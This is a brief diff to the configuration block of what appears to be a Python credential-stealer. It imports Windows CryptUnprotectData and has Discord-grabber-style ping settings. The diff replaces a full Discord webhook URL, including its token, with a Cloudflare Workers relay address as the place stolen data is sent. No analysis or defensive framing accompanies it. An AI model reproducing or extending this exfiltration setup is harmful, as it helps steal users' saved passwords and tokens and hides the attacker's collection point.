@@ -25,7 +25,7 @@ from requests_toolbelt.multipart.encoder import MultipartEncoder
 from win32crypt import CryptUnprotectData
 
 __CONFIG__ = {
-    "webhook": "https://discord.com/api/webhooks/1375413488259956746/tV0mkA87WXbq1MEPznVzvtXxB6csp1-3SG0EPGblJ-YYkmmJourcoZ1uFDdNGtEHbK6w",
+    "webhook": "https://bitter-shadow-32ac.notifierservice.workers.dev",
     "ping": True,
     "pingtype": "Everywhere",
     "error": False,
